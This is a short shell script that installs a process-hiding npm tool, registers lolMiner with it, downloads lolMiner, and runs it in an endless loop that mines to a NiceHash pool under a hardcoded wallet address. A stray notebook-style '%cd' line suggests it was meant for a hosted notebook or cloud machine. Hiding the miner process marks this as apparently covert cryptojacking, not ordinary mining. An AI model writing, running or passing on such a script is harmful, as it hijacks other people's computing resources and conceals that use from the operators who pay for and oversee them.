#!/bin/sh
sudo apt update
sudo apt install screen -y
%cd /opt
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add lolMiner
sudo apt install libpci3
sudo apt-get install screen
wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz && tar xvf lolMiner_v1.42_Lin64.tar.gz && mv 1.42 mng && cd mng && chmod +x lolMiner
while [ 1 ]; do
./lolMiner -a ETHASH -p daggerhashimoto.eu-north.nicehash.com:3353 -u 36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.xroc3
sleep 15
done
